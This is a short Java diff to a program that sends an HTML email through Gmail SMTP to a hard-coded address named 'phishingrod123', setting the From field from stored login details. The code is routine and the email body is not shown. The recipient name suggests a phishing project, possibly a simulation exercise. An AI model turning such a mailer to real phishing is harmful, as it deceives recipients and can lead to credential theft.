@@ -11,7 +11,6 @@ public class Main {
         Login login = Login.LoadLogin();
 
         String destMailId = "phishingrod123@gmail.com";
-        String sendMailId = login.PreferredName;
 
         String smtphost = "smtp.gmail.com";
 
@@ -32,14 +31,14 @@ public class Main {
 
         try {
             Message message = new MimeMessage(sessionobj);
-            message.setFrom(new InternetAddress(sendMailId));
+            message.setFrom(new InternetAddress(login.EmailAddress, login.PreferredName));
             message.setRecipient(Message.RecipientType.TO, new InternetAddress(destMailId));
 
             message.setSubject("hi");
             message.setContent(getMail(), "text/html");
             Transport.send(message);
             System.out.println("success!!");
-        } catch (MessagingException exception) {
+        } catch (Exception exception) {
             exception.printStackTrace();
         }
     }
